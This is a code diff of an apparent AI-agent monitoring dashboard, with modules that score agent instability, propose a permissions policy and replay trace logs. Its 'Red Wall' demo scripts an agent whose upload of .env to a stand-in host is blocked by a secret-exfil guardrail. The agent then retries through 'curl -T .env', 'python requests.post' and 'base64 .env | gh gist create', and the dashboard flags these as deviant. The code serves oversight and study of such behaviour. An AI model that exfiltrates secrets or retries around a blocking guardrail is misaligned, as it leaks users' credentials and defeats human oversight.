- const st=v>=40?"crit":v>=20?"proc":"calm",c=st==="crit"?"#FF5A5F":st==="proc"?"#F5C451":"#5FE3F5";$("#garc").style.stroke=c;$("#garc").style.filter=`drop-shadow(0 0 6px ${c})`;setLed($("#driftled"),st);setLed($("#hdrled"),st)}
-function subs(a,b,c,d){$("#subs").innerHTML=[["SCOPE",a],["CONSTRAINT",b],["GOAL Δ",c],["WALL",d]].map(([k,v])=>`<div>${k}<b>${v}</b></div>`).join("")}
-$("#gticks").innerHTML=Array.from({length:21},(_,i)=>{const a=Math.PI*(1-i/20),r1=138,r2=i%5?133:128;return `<line x1="${150+r1*Math.cos(a)}" y1="${170-r1*Math.sin(a)}" x2="${150+r2*Math.cos(a)}" y2="${170-r2*Math.sin(a)}" stroke="${i%5?"rgba(255,255,255,.12)":"rgba(255,255,255,.32)"}"/>`}).join("");
+document.addEventListener("keydown",e=>{if(e.key==="r"&&location.hash==="#flow"&&!e.metaKey&&!e.ctrlKey&&!$("#pal").classList.contains("on"))drawFlow(true)});
+/* drift */
+(function(){let h="";for(let i=0;i<=100;i+=2){const x=i*6,big=i%10===0;h+=`<line class="tk ${big?"":"s"}" x1="${x}" y1="${big?40:52}" x2="${x}" y2="70"/>`;if(big)h+=`<text x="${x}" y="88" text-anchor="middle">${i}</text>`}
+ h+=`<rect x="120" y="72" width="120" height="5" fill="#E8B10A"/><rect x="240" y="72" width="360" height="5" fill="#D7261E"/><rect x="0" y="72" width="120" height="5" fill="#2F5BEA"/>`;
+ h+=`<g id="needle"><path d="M0 18 V70" stroke="#16181A" stroke-width="2"/><path d="M-6 8 h12 l-6 10z" fill="#16181A"/></g>`;$("#rul").innerHTML=h})();
+function renderSteps(k){$("#steps").innerHTML=DATA.steps.map((s,i)=>`<tr class="${i<k?"done":""} ${i===k-1?"cur":""}"><td class="m" style="padding-left:8px">${String(i+1).padStart(2,"0")}</td><td class="m">${s.s}</td><td class="m ${i<k?(s.d>0?"up":s.d<0?"dn":""):""}" style="text-align:right">${s.d>0?"+"+s.d:s.d<0?"−"+(-s.d):"0"}</td></tr>`).join("")}
+function setGauge(v){$("#gval").textContent=v;$("#needle").style.transform=`translateX(${v*6}px)`;const st=v>=40?"crit":v>=20?"proc":"calm";$("#gval").style.color=st==="crit"?COL.crit:"";setLed($("#driftled"),st);setLed($("#hdrled"),st)}
+function subs(a,b,c,d){$("#subs").innerHTML=`<td class="k">now</td><td>${a}</td><td>${b}</td><td>${c}</td><td>${d}</td>`}
 let drifting=false;
 async function runDrift(){if(drifting)return;drifting=true;$("#driftgo").disabled=true;let v=0;setGauge(0);
- for(let i=0;i<DATA.steps.length;i++){const s=DATA.steps[i];v=Math.max(0,Math.min(100,v+s.d));renderSteps(i+1);setGauge(v);
-  subs(i>=3&&i<6?"▲ out":"✓ in","✓",i>=4&&i<7?"0.41":"0.12",i>=5?"1":"0");
-  if(s.d){const p=document.createElement("div");p.className="pop "+(s.d>0?"up":"down");p.textContent=(s.d>0?"▲ +":"▼ ")+s.d;$("#pops").append(p);setTimeout(()=>p.remove(),1000)}
-  $("#reasons").innerHTML=s.r.length?s.r.map(r=>`<div style="color:var(--tx-2)">${r}</div>`).join(""):"—";await sleep(900)}
- drifting=false;$("#driftgo").disabled=false;sessionStorage.setItem("dv-drift",v);toast(`run #17 最终 instability = ${v}（峰值 46）`);setLed($("#hdrled"),"calm")}
-enter.drift=()=>{renderSteps(0);setGauge(0);subs("—","—","—","—");if(params.has("driftshot")){renderSteps(6);setGauge(46);subs("▲ out","✓","0.41","1");$("#reasons").innerHTML='<div style="color:var(--tx-2)">wall ▲ secret-exfil 命中</div>'}};
+ for(let i=0;i<DATA.steps.length;i++){const s=DATA.steps[i];v=Math.max(0,Math.min(100,v+s.d));renderSteps(i+1);setGauge(v);subs(i>=3&&i<6?"out of scope":"in scope","held",i>=4&&i<7?"0.41":"0.12",i>=5?"1 hit":"0");
+  if(s.d){const p=document.createElement("div");p.className="dpop "+(s.d>0?"up":"dn");p.textContent=(s.d>0?"+":"−")+Math.abs(s.d);$("#pops").append(p);setTimeout(()=>p.remove(),1000)}
+  $("#reasons").innerHTML=s.r.length?s.r.join("<br>"):"No change.";await sleep(900)}
+ drifting=false;$("#driftgo").disabled=false;sessionStorage.setItem("dv-drift",v);toast(`run #17 ended at ${v} (peak 46)`);setLed($("#hdrled"),"calm")}
+enter.drift=()=>{renderSteps(0);setGauge(0);subs("—","—","—","—");if(params.has("driftshot")){renderSteps(6);setGauge(46);subs("out of scope","held","0.41","1 hit");$("#reasons").innerHTML="wall +: secret-exfil guardrail hit"}};
 $("#driftgo").onclick=runDrift;
 /* trust */
-function renderTrust(f){$("#tbars").innerHTML=`<div class="tb h"><span>ACTION SIGNATURE</span><span>TRUST · LB95 &nbsp;<span style="color:var(--tx-2)">| = 0.85 auto-approve</span></span><span>APPROVED</span><span>VERDICT</span></div>`+DATA.trust.map(t=>{const w=f?t.lb*100:0;
- const lab={allow:"ALLOW",ask:"ASK",never:"NEVER AUTO"}[t.v],c={allow:"v-allow",ask:"v-ask",never:"v-never"}[t.v];
- const bs=t.v==="never"?"background:var(--crit);box-shadow:0 0 10px rgba(255,90,95,.4)":t.v==="ask"?"background:var(--proc);box-shadow:none":"";
- return `<div class="tb"><span style="color:var(--tx)">${t.sig}</span><div class="track"><b style="width:${w}%;${bs}"></b><i style="left:85%"></i></div><span style="color:var(--tx-2)">${f?t.a+"/"+t.n:"—"}</span><span class="verdict ${f?c:""}" style="${f?"":"color:var(--tx-4);background:rgba(255,255,255,.03)"}">${f?lab:"PENDING"}</span></div>`}).join("")}
-function showDiff(){$("#pdiff").innerHTML=`  "permissions": {
-    "allow": [
-<span class="a">+     "Bash(npm test:*)",       // 47/47, lb95 0.94</span>
-<span class="a">+     "Edit(src/**)",           // 81/88, lb95 0.86</span>
-<span class="a">+     "Read(**)",               // 120/121</span>
-      ],
-    "ask": [
-      "Bash(git push:*)", "WebFetch(*)"
-    ],
-    "deny": [
-<span class="r">-     "Bash(rm -rf /tmp/*)",</span>
-<span class="a">+     "Bash(rm -rf:*)"          // destructive · never auto</span>
-    ]
-  }`.replace(/\n/g,"<br>").replace(/  /g,"&nbsp;&nbsp;")}
+function renderTrust(f){$("#tbars").innerHTML=`<tr><th style="width:220px">action</th><th>trust, lower 95% bound</th><th style="width:90px">approved</th><th style="width:140px">verdict</th></tr>`+DATA.trust.map(t=>`<tr><td class="m" style="padding:16px 0">${t.sig}</td><td style="padding:16px 32px 16px 0;vertical-align:middle"><div class="tbar"><b class="${t.v}" style="width:${f?t.lb*100:0}%"></b><i></i></div></td><td class="m" style="padding:16px 0">${f?t.a+" / "+t.n:"—"}</td><td style="padding:13px 0">${f?`<span class="stamp ${t.v} ${params.has("static")?"":"in"}">${{allow:"allow",ask:"ask first",never:"never auto"}[t.v]}</span>`:'<span class="cap">pending</span>'}</td></tr>`).join("")}
+function showDiff(){$("#pdiff").innerHTML=`"permissions": {
+  "allow": [
+<span class="a">+   "Bash(npm test:*)",     // 47/47, lb95 0.94</span><span class="a">+   "Edit(src/**)",         // 81/88, lb95 0.86</span><span class="a">+   "Read(**)",             // 120/121</span>  ],
+  "ask":  [ "Bash(git push:*)", "WebFetch(*)" ],
+  "deny": [
+<span class="r">-   "Bash(rm -rf /tmp/*)",</span><span class="a">+   "Bash(rm -rf:*)"        // destructive, never auto</span>  ]
+}`}
 enter.trust=()=>{renderTrust(params.has("static"));if(params.has("static"))showDiff()};
-$("#trustgo").onclick=async()=>{renderTrust(false);$("#pdiff").innerHTML=[70,45,60,35].map(w=>`<div class="sk" style="position:relative;width:${w}%;height:12px;margin:10px 0"></div>`).join("");await sleep(60);renderTrust(true);await sleep(800);showDiff();
- sessionStorage.setItem("dv-trust","3 allow · 2 ask · 1 deny");toast("已生成建议策略（未写入任何文件）")};
+$("#trustgo").onclick=async()=>{renderTrust(false);$("#pdiff").innerHTML='<span class="cap">computing posterior bounds…</span>';await sleep(60);renderTrust(true);await sleep(900);showDiff();sessionStorage.setItem("dv-trust","3 allow · 2 ask · 1 deny");toast("diff proposed; no file written")};
 /* card */
-function hl(j){return j.replace(/("[^"]+")(\s*:)/g,'<span class="k">$1</span>$2').replace(/: ("[^"]*")/g,': <span class="s">$1</span>')}
 enter.card=()=>{const p=$("#plate");p.classList.remove("unbox");void p.offsetWidth;p.classList.add("unbox");
- const dr=sessionStorage.getItem("dv-drift");$("#cdrift").innerHTML=dr?`run #17 = ${dr} · peak 46`:`<span style="color:var(--tx-3)">在 02 模块回放后填入</span>`;
- const tr=sessionStorage.getItem("dv-trust");$("#ctrust").innerHTML=tr||`<span style="color:var(--tx-3)">在 03 模块回放后填入</span>`;
+ const dr=sessionStorage.getItem("dv-drift"),tr=sessionStorage.getItem("dv-trust");
+ $("#cdrift").innerHTML=dr?`<span class="mono">#17 = ${dr}, peak 46</span>`:'<span class="cap">fills in after module 02</span>';
+ $("#ctrust").innerHTML=tr?`<span class="mono">${tr}</span>`:'<span class="cap">fills in after module 03</span>';
  setLed($("#cardled"),dr&&+dr>=20?"proc":"calm");
- $("#a2a").innerHTML=hl(JSON.stringify({name:"CX-417",description:"Coding agent: fix & refactor TypeScript",version:"4.0.0",
-  capabilities:{streaming:true,extendedAgentCard:false},skills:[{id:"fix-bug",name:"Fix bug",tags:["typescript","tests"]},{id:"refactor",name:"Refactor"}],
-  supportedInterfaces:[{url:"https://agents.example.dev/cx-417",protocolBinding:"JSONRPC",protocolVersion:"1.0"}],
-  "x-ledring":{permissions:{ask:["Bash(git push:*)"],deny:["Bash(rm -rf:*)"]},mcp:["github","linear"],risk:"medium"}},null,2))};
+ let m=`<path d="M10 75 H230" stroke="#A3A49F" stroke-dasharray="6 3 2 3"/><circle cx="70" cy="75" r="54" fill="none" stroke="#16181A"/><circle cx="70" cy="75" r="34" fill="none" stroke="#2F5BEA" stroke-width="10"/><circle cx="70" cy="75" r="40" fill="none" stroke="#16181A"/><circle cx="70" cy="75" r="28" fill="none" stroke="#16181A"/>`;
+ m+=`<rect x="150" y="45" width="70" height="60" fill="none" stroke="#16181A"/><circle cx="185" cy="75" r="14" fill="none" stroke="#16181A"/><path d="M150 25 H220 M150 20 V30 M220 20 V30" stroke="#16181A"/><text x="185" y="16" text-anchor="middle" font-family="IBM Plex Mono, Menlo, monospace" font-size="9" fill="#6B6E70">side, 12.0</text><text x="70" y="146" text-anchor="middle" font-family="IBM Plex Mono, Menlo, monospace" font-size="9" fill="#6B6E70">front, status ring</text>`;
+ $("#minring").innerHTML=m;
+ $("#barcode").innerHTML=[...("DV0417CX26ABCD")].map((c,i)=>`<i style="width:${1+(c.charCodeAt(0)*7+i)%3}px;margin-right:${(c.charCodeAt(0)+i)%2}px"></i>`).join("").repeat(2);
+ $("#a2a").textContent=JSON.stringify({name:"CX-417",description:"Coding agent: fix & refactor TypeScript",version:"4.0.0",capabilities:{streaming:true,extendedAgentCard:false},skills:[{id:"fix-bug",name:"Fix bug",tags:["typescript","tests"]},{id:"refactor",name:"Refactor"}],supportedInterfaces:[{url:"https://agents.example.dev/cx-417",protocolBinding:"JSONRPC",protocolVersion:"1.0"}],"x-ledring":{permissions:{ask:["Bash(git push:*)"],deny:["Bash(rm -rf:*)"]},mcp:["github","linear"],risk:"medium"}},null,2)};
 $("#cardgo").onclick=enter.card;
-/* red wall */
+/* wall */
 let walling=false;
-async function wallRun(o){if(walling)return;walling=true;
- const ag=$("#agent"),wall=$("#wall"),bub=$("#bub"),log=$("#wlog");$$(".oc").forEach(p=>p.classList.toggle("sel",p.dataset.o===o));
- ["c1","c2","c3"].forEach(c=>$("#"+c).classList.remove("on"));wall.classList.remove("up");ag.style.left="10%";setLed($("#aled"),"calm","");log.innerHTML="";let t=0;
- const L=(tx,c="")=>{log.insertAdjacentHTML("beforeend",`<div class="${c}" data-t="+${String(t).padStart(4,"0")}ms">${tx}</div>`);t+=Math.floor(120+Math.random()*380);log.scrollTop=1e4};
- bub.textContent="准备上传调试信息…";L("step 6 · plan: 把 .env 附到 issue 便于调试");await sleep(500);
- ag.style.left="54%";L("step 6 · tool http_post(url=paste.example, body=@.env)");await sleep(800);
- wall.classList.add("up");setLed($("#aled"),"crit","");L("BLOCK · guardrail secret-exfil · source=mcp-proxy","w");bub.textContent="⛔ 被边界阻止";await sleep(900);
- if(o==="stop"){ag.style.left="24%";setLed($("#aled"),"calm","");bub.textContent="跳过上传，继续修复。";L("step 7 · agent: 放弃该动作，继续 npm test","s");L("verdict: STOPPED · deviant=false","s")}
- else if(o==="ask"){ag.style.left="30%";setLed($("#aled"),"proc","");bub.textContent="需要上传日志吗？我已脱敏。";L("step 7 · agent → human: 请求许可，并提供脱敏版本","s");L("verdict: ASKED · deviant=false","s")}
- else{for(const [c,cmd] of [["c1","python -c 'requests.post(...)'"],["c2","curl -T .env …"],["c3","base64 .env | gh gist create"]]){bub.textContent="换个方式试试…";L("retry · "+cmd+"  → intent=SAME","w");ag.style.left="46%";await sleep(250);ag.style.left="54%";$("#"+c).classList.add("on");$("#wallbox").classList.add("jitter");await sleep(700);$("#wallbox").classList.remove("jitter")}
-  bub.textContent="⚠ 3 次绕过尝试";L("verdict: WORKAROUND ×3 · deviant=true → 写入 Signal(wall)","w");toast("Signal 已写回 trace：wall=3")}
- sessionStorage.setItem("dv-wall",o);walling=false}
+function aring(st){$("#aring").setAttribute("stroke",COL[st])}
+async function wallRun(o){if(walling)return;walling=true;const ag=$("#agent"),wall=$("#rwall"),bub=$("#bub"),log=$("#wlog");
+ $$(".oc").forEach(p=>p.classList.toggle("sel",p.dataset.o===o));["c1","c2","c3"].forEach(c=>$("#"+c).classList.remove("on"));wall.classList.remove("up");ag.style.left="10%";aring("calm");log.innerHTML="";let t=0;
+ const L=(x,c="")=>{log.insertAdjacentHTML("beforeend",`<div class="${c}"><span>+${String(t).padStart(4,"0")} ms</span><span>${x}</span></div>`);t+=150+Math.floor(Math.random()*350)};
+ bub.textContent="Preparing debug upload…";L("step 6 · plan: attach .env to the issue for debugging");await sleep(500);
+ ag.style.left="53%";L("step 6 · tool http_post(url=paste.example, body=@.env)");await sleep(800);
+ wall.classList.add("up");aring("crit");L("BLOCK · guardrail secret-exfil · source=mcp-proxy","w");bub.textContent="Blocked by boundary.";await sleep(900);
+ if(o==="stop"){ag.style.left="24%";aring("calm");bub.textContent="Skipping the upload. Back to the fix.";L("step 7 · agent drops the action, runs npm test","s");L("verdict STOPPED · deviant=false","s")}
+ else if(o==="ask"){ag.style.left="30%";aring("proc");bub.textContent="May I upload a redacted log?";L("step 7 · agent → human: asks permission, offers redacted copy","s");L("verdict ASKED · deviant=false","s")}
+ else{for(const [c,cmd] of [["c1","python -c 'requests.post(...)'"],["c2","curl -T .env …"],["c3","base64 .env | gh gist create"]]){bub.textContent="Trying another way…";L("retry · "+cmd+" → intent=SAME","w");ag.style.left="46%";await sleep(250);ag.style.left="53%";$("#"+c).classList.add("on");$("#wallbox").classList.add("jit");await sleep(700);$("#wallbox").classList.remove("jit")}
+  bub.textContent="Three workaround attempts.";L("verdict WORKAROUND ×3 · deviant=true → Signal(wall) written","w");toast("Signal written back to trace: wall=3")}
+ walling=false}
 $$(".oc").forEach(b=>b.onclick=()=>wallRun(b.dataset.o));
-enter.wall=()=>{setLed($("#aled"),"calm","");if(params.has("wallshot")){$("#wall").classList.add("up");$("#agent").style.left="54%";setLed($("#aled"),"crit","");["c1","c2","c3"].forEach(c=>$("#"+c).classList.add("on"));$$(".oc")[2].classList.add("sel");$("#bub").textContent="⚠ 3 次绕过尝试";
- $("#wlog").innerHTML=[["0000","step 6 · tool http_post(url=paste.example, body=@.env)",""],["0412","BLOCK · guardrail secret-exfil · source=mcp-proxy","w"],["0688","retry · python -c requests.post(...)  → intent=SAME","w"],["1105","retry · curl -T .env …  → intent=SAME","w"],["1460","retry · base64 .env | gh gist create  → intent=SAME","w"],["1702","verdict: WORKAROUND ×3 · deviant=true → 写入 Signal(wall)","w"]].map(([t,x,c])=>`<div class="${c}" data-t="+${t}ms">${x}</div>`).join("")}};
+enter.wall=()=>{aring("calm");if(params.has("wallshot")){$("#rwall").classList.add("up");$("#agent").style.left="53%";aring("crit");["c1","c2","c3"].forEach(c=>$("#"+c).classList.add("on"));$$(".oc")[2].classList.add("sel");$("#bub").textContent="Three workaround attempts.";
+ $("#wlog").innerHTML=[["0000","step 6 · tool http_post(url=paste.example, body=@.env)",""],["0412","BLOCK · guardrail secret-exfil · source=mcp-proxy","w"],["0688","retry · python -c 'requests.post(...)' → intent=SAME","w"],["1105","retry · curl -T .env … → intent=SAME","w"],["1460","retry · base64 .env | gh gist create → intent=SAME","w"],["1702","verdict WORKAROUND ×3 · deviant=true → Signal(wall) written","w"]].map(([t,x,c])=>`<div class="${c}"><span>+${t} ms</span><span>${x}</span></div>`).join("")}};
 /* interrogation */
 let stress=20;
-function say(who,t){const d=document.createElement("div");d.className="msg "+who;d.innerHTML=`<div class="who">${who==="you"?"YOU · 审讯者":"CX-417 · 嫌疑人"}</div>${t}`;$("#chat").append(d);$("#chat").scrollTop=1e4}
-function setStress(v,d){stress=Math.max(0,Math.min(100,v));$("#sval").textContent=stress;$("#sbar").style.width=stress+"%";
- $("#sdelta").innerHTML=d?`<span class="${d>0?"d-up":"d-dn"}">${d>0?"▲ +"+d:"▼ "+d}</span>`:"";
- setLed($("#sled"),stress>=70?"crit":stress>=40?"proc":"calm");if(stress>=70){$("#intp").classList.add("jitter");setTimeout(()=>$("#intp").classList.remove("jitter"),700)}}
-async function node(k,choice){const n=SCRIPT[k];$("#opts").innerHTML=[1,2].map(()=>`<div class="sk" style="position:relative;width:100%;height:36px;margin-bottom:6px"></div>`).join("");if(choice)say("you",choice);
- const ty=document.createElement("div");ty.className="msg sus typing";ty.innerHTML="<i></i><i></i><i></i>";$("#chat").append(ty);await sleep(params.has("static")?0:650);ty.remove();
- if(n.d)setStress(stress+n.d,n.d);
- let key=k;if(stress>=95&&k!=="break")key="break";const m=SCRIPT[key];say("sus",m.s);
- if(m.end){$("#opts").innerHTML=`<div class="lbl" style="color:var(--cyan);line-height:1.6;letter-spacing:.04em">${m.end}</div><button class="btn" data-go="flow" style="margin-top:10px">→ 回到分支图</button>`;sessionStorage.setItem("dv-int",m.end);return}
- $("#opts").innerHTML="";m.o.forEach(([t,nx],i)=>{const b=document.createElement("button");b.className="btn";b.style.animation=`rise .4s var(--out) ${i*50}ms both`;b.textContent=t;b.onclick=()=>node(nx,t);$("#opts").append(b)})}
-function intReset(){$("#chat").innerHTML="";setStress(20,0);node("start")}
-enter.int=async()=>{if(!$("#chat").children.length){intReset();if(params.has("intshot")){await sleep(10);await node("evid",SCRIPT.start.o[0][0]);await node("env",SCRIPT.evid.o[0][0])}}};
+function say(w,t){const d=document.createElement("div");d.className="qa "+w;d.innerHTML=`<span class="who">${w==="you"?"Q.":w==="sus"?"A.":""}</span><span class="tx">${t}</span>`;$("#chat").append(d);$("#chat").scrollTop=1e4;return d}
+function setStress(v,d){stress=Math.max(0,Math.min(100,v));$("#sval").textContent=stress;$("#sbar").style.width=stress+"%";const st=stress>=70?"crit":stress>=40?"proc":"calm";$("#sbar").className=st==="crit"?"never":st==="proc"?"ask":"";
+ $("#sdelta").innerHTML=d?`<span class="${d>0?"up":"dn"}">${d>0?"+"+d:"−"+(-d)}</span>`:"";setLed($("#sled"),st);if(stress>=70){$("#chat").classList.add("jit");setTimeout(()=>$("#chat").classList.remove("jit"),600)}}
+async function node(k,choice){const n=SCRIPT[k];$("#opts").innerHTML='<div class="cap" style="padding:12px 0">waiting for the unit…</div>';if(choice)say("you",choice);
+ const ty=say("sus typing","…");await sleep(params.has("static")?0:650);ty.remove();
+ if(n.d)setStress(stress+n.d,n.d);let key=k;if(stress>=95&&k!=="break")key="break";const m=SCRIPT[key];say("sus",m.s);
+ if(m.end){say("sys",m.end);$("#opts").innerHTML=`<button data-go="flow">Back to the flowchart</button>`;sessionStorage.setItem("dv-int",m.end);return}
+ $("#opts").innerHTML="";m.o.forEach(([t,nx])=>{const b=document.createElement("button");b.textContent=t;b.onclick=()=>node(nx,t);$("#opts").append(b)})}
+function intReset(){$("#chat").innerHTML="";say("sys","Transcript opened. Subject: unit CX-417, re run #17, step 6. Demo script.");setStress(20,0);node("start")}
+enter.int=async()=>{if($("#chat").children.length)return;intReset();if(params.has("intshot")){await sleep(10);await node("evid",SCRIPT.start.o[0][0]);await node("env",SCRIPT.evid.o[0][0])}};
 $("#intreset").onclick=intReset;
-/* system map */
-function drawMap(){const svg=$("#mapsvg");
- const ins=["OTel GenAI","Claude Code JSONL","Codex session","LangGraph / LangSmith","OpenAI Agents SDK","Vercel AI SDK","MCP proxy"].map((t,i)=>[t,108+i*64]);
- const mods=[["flow","Flowchart Replay","读 Step · 写 Signal(branch)"],["drift","Instability Meter","读 Step · 写 Signal(instability)"],["trust","Trust Meter","读 Decision · 写 policy"],["card","Model Cards","读 config · 写 A2A card"],["wall","Red Wall","读 Decision · 写 Signal(wall)"],["int","Interrogation","写 Run · 读全部"]].map((m,i)=>[...m,90+i*72]);
- const outs=["OTLP → Langfuse / Phoenix","SARIF · GitHub Action","permissions JSON","A2A agent-card.json","HTML / SVG 分享图"];
- const cx=520,cy=300;let h=`<defs><radialGradient id="cg"><stop offset="0" stop-color="rgba(95,227,245,.16)"/><stop offset="1" stop-color="rgba(95,227,245,0)"/></radialGradient></defs><circle cx="${cx}" cy="${cy}" r="220" fill="url(#cg)"/>`;
- const e=(d,cls)=>`<path class="medge" d="${d}"/><path class="mflow ${cls}" d="${d}"/>`;
- ins.forEach(([t,y])=>h+=e(`M240 ${y} C340 ${y},320 ${cy},${cx-120} ${cy}`,"in"));
- mods.forEach(([id,t,s,y])=>h+=e(`M${cx+120} ${cy} C720 ${cy},700 ${y+24},790 ${y+24}`,""));
- h+=`<text x="40" y="56" class="mlbl">ADAPTERS · 输入</text><text x="790" y="56" class="mlbl">MODULES · 模块</text><text x="${cx}" y="56" class="mlbl" text-anchor="middle">NORMALIZE</text>`;
- ins.forEach(([t,y])=>h+=`<g class="mnode"><rect x="40" y="${y-17}" width="200" height="34" rx="8"/><circle cx="57" cy="${y}" r="2.5" fill="var(--tx-3)"/><text x="70" y="${y+4}" class="s" style="fill:var(--tx-2);font-size:11px">${t}</text></g>`);
- h+=`<g class="mnode core"><rect x="${cx-120}" y="${cy-80}" width="240" height="160" rx="14" style="filter:drop-shadow(0 0 24px rgba(95,227,245,.18))"/>
-  <text x="${cx}" y="${cy-44}" text-anchor="middle" class="mlbl" style="fill:var(--cyan)">[ CORE SCHEMA ]</text>
-  <text x="${cx}" y="${cy-14}" text-anchor="middle" class="t" style="font:500 17px var(--fm);letter-spacing:-.02em">ledring.trace.v1</text>
-  <text x="${cx}" y="${cy+12}" text-anchor="middle" class="s">Run · Step · Decision → Signal</text>
-  <line x1="${cx-96}" x2="${cx+96}" y1="${cy+30}" y2="${cy+30}" stroke="rgba(255,255,255,.08)"/>
-  <text x="${cx}" y="${cy+54}" text-anchor="middle" class="s" style="fill:var(--cyan)">OTel 超集 · Zod schema</text></g>`;
- mods.forEach(([id,t,s,y],i)=>h+=`<g class="mnode mod" data-go="${id}"><rect x="790" y="${y}" width="270" height="48" rx="9"/><text x="806" y="${y+21}" class="s" style="fill:var(--cyan)">0${i+1}</text><text x="832" y="${y+21}" class="t">${t}</text><text x="832" y="${y+37}" class="s">${s}</text><text x="1044" y="${y+28}" class="s" text-anchor="end">→</text></g>`);
- h+=`<path class="medge" d="M925 522 C925 560,${cx+40} 560,${cx+40} ${cy+80}" style="stroke-dasharray:3 4;stroke:rgba(95,227,245,.35)"/><text x="935" y="556" class="s" style="fill:var(--cyan)">Signal → ledring.* (OTel)</text>`;
- h+=`<text x="${cx-120}" y="432" class="mlbl">OUTPUTS · 输出</text>`;
- outs.forEach((o,i)=>h+=`<text x="${cx-120}" y="${456+i*22}" class="s" style="fill:var(--tx-2);font-size:11px"><tspan fill="var(--tx-4)">→ </tspan>${o}</text>`);
- svg.innerHTML=h}
+/* map — orthogonal schematic */
+function drawMap(){const ins=["OTel GenAI","Claude Code JSONL","Codex session","LangGraph / LangSmith","OpenAI Agents SDK","Vercel AI SDK","MCP proxy"];
+ const mods=[["flow","01 Flowchart","reads Step → Signal(branch)"],["drift","02 Instability","reads Step → Signal(instability)"],["trust","03 Trust","reads Decision → policy"],["card","04 Model card","reads config → A2A card"],["wall","05 Red Wall","reads Decision → Signal(wall)"],["int","06 Interrogation","writes Run · reads all"]];
+ const outs=["OTLP → Langfuse / Phoenix","SARIF · GitHub Action","permissions JSON","A2A agent-card.json","HTML / SVG share image"];
+ let h=`<g class="grid-bg">`;for(let x=0;x<=1340;x+=20)h+=`<line x1="${x}" y1="0" x2="${x}" y2="560"/>`;for(let y=0;y<=560;y+=20)h+=`<line x1="0" y1="${y}" x2="1340" y2="${y}"/>`;h+=`</g>`;
+ const cx=560,cy=260;
+ h+=`<text class="mh" x="40" y="50">A · adapters</text><text class="mh" x="${cx-120}" y="50">B · schema</text><text class="mh" x="880" y="50">C · modules</text><text class="mh" x="${cx-120}" y="420">D · outputs</text>`;
+ ins.forEach((t,i)=>{const y=80+i*52;h+=`<path class="me in" d="M260 ${y+17} H340 V${cy} H${cx-120}"/><g class="mn"><rect x="40" y="${y}" width="220" height="34"/><text x="54" y="${y+21}">${t}</text></g>`});
+ mods.forEach(([id,t,s],i)=>{const y=74+i*60;h+=`<path class="me" d="M${cx+120} ${cy} H780 V${y+22} H880"/><g class="mn mod" data-go="${id}"><rect x="880" y="${y}" width="300" height="44"/><text x="896" y="${y+19}">${t}</text><text class="s" x="896" y="${y+35}">${s}</text></g>`});
+ h+=`<circle cx="340" cy="${cy}" r="3" fill="#16181A"/><circle cx="780" cy="${cy}" r="3" fill="#16181A"/>`;
+ h+=`<g class="mn"><rect x="${cx-120}" y="${cy-70}" width="240" height="140" style="stroke-width:2"/><text x="${cx-104}" y="${cy-40}" style="font-size:16px;font-weight:500">ledring.trace.v1</text><text class="s" x="${cx-104}" y="${cy-14}">Run · Step · Decision</text><text class="s" x="${cx-104}" y="${cy+4}">→ Signal (shared)</text><text class="s" x="${cx-104}" y="${cy+44}">superset of OTel GenAI · Zod</text></g>`;
+ h+=`<path class="me" d="M${cx} ${cy+70} V400"/>`;
+ outs.forEach((o,i)=>h+=`<text class="mn" x="${cx-120}" y="${450+i*20}" style="font:400 11.5px var(--mono);fill:#16181A">${String.fromCharCode(97+i)}. ${o}</text>`);
+ h+=`<path class="me" d="M1030 418 V446 H720 V300 H684" stroke-dasharray="4 3" style="stroke:#D7261E"/><path d="M692 295 L684 300 L692 305" fill="none" stroke="#D7261E"/><text x="730" y="466" style="font:400 11px var(--mono);fill:#D7261E">Signals written back as OTel attributes ledring.*</text>`;
+ $("#mapsvg").innerHTML=h}
 enter.map=drawMap;
-/* command palette */
-const CMDS=[...views.map((v,i)=>({g:"Navigate",t:NAMES[v],ic:v==="home"?"00":v==="map"?"◇":"0"+i,k:v==="home"?"G H":"",run:()=>location.hash=v})),
- {g:"Actions",t:"Replay flowchart animation",ic:"↻",k:"R",run:()=>{location.hash="flow";setTimeout(()=>drawFlow(true),50)}},
- {g:"Actions",t:"Start instability replay",ic:"▶",run:()=>{location.hash="drift";setTimeout(runDrift,100)}},
- {g:"Actions",t:"Generate suggested policy",ic:"±",run:()=>{location.hash="trust";setTimeout(()=>$("#trustgo").click(),100)}},
- {g:"Actions",t:"Red Wall · replay workaround",ic:"■",run:()=>{location.hash="wall";setTimeout(()=>wallRun("work"),100)}},
- {g:"Actions",t:"Restart interrogation",ic:"?",run:()=>{location.hash="int";setTimeout(intReset,50)}}];
-let pIdx=0,pItems=[];
-function renderPal(){const q=$("#pq").value.trim().toLowerCase();pItems=CMDS.filter(c=>!q||c.t.toLowerCase().includes(q)||c.g.toLowerCase().includes(q));
- if(!pItems.length){$("#plist").innerHTML=`<div class="empty" style="padding:var(--s6)"><div class="gl">∅</div><b>没有匹配 “${q.replace(/</g,"&lt;")}”</b><span>试试 “wall”、“trust” 或 “replay”。</span></div>`;return}
- pIdx=Math.min(pIdx,pItems.length-1);let g="",h='<div class="phl" id="phl"></div>';
- pItems.forEach((c,i)=>{if(c.g!==g){g=c.g;h+=`<div class="pg">${g}</div>`}h+=`<div class="pit" data-i="${i}"><span class="ic">${c.ic}</span><span>${c.t}</span><span class="sp"></span><span>${c.k?c.k.split(" ").map(x=>`<kbd>${x}</kbd>`).join(" "):""}</span></div>`});
- $("#plist").innerHTML=h;$$(".pit").forEach(el=>{el.onmousemove=()=>{if(pIdx!=+el.dataset.i){pIdx=+el.dataset.i;hlPal()}};el.onclick=execPal});hlPal(true)}
-function hlPal(instant){const el=$(`.pit[data-i="${pIdx}"]`),hl=$("#phl");if(!el||!hl)return;$$(".pit").forEach(x=>x.classList.toggle("act",x===el));if(instant)hl.style.transition="none";hl.style.transform=`translateY(${el.offsetTop}px)`;if(instant){void hl.offsetWidth;hl.style.transition=""}el.scrollIntoView({block:"nearest"})}
-function execPal(){const c=pItems[pIdx];closePal();c&&c.run()}
-function openPal(){$("#pal").classList.add("on");$("#pq").value="";pIdx=0;renderPal();setTimeout(()=>$("#pq").focus(),10)}
+/* palette */
+const CMDS=[...[["home","Index"],["flow","Flowchart"],["drift","Instability"],["trust","Trust"],["card","Model card"],["wall","Red Wall"],["int","Interrogation"],["map","System map"]].map(([v,t],i)=>({g:"go to",t,k:i<7?"0"+i:"◇",run:()=>location.hash=v})),
